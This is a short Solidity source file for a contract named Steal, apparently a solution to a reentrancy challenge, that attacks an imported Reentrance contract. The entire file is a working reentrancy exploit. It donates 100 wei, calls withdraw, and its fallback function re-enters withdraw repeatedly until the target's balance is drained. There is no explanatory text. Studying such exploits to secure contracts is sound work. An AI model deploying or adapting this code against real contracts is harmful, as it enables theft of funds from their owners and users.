// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./reentrancy.sol";

contract Steal {
    Reentrance public reentrance;

    constructor(address _reentranceAddr) payable {
        reentrance = Reentrance(_reentranceAddr);
    }

    function steal() public payable {
        require(msg.value >= 100 wei);

        reentrance.donate{value: 100 wei}(address(this));
        reentrance.withdraw(100);
    }

    fallback() external payable {
        if (address(reentrance).balance >= 100 wei) {
            reentrance.withdraw(100);
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
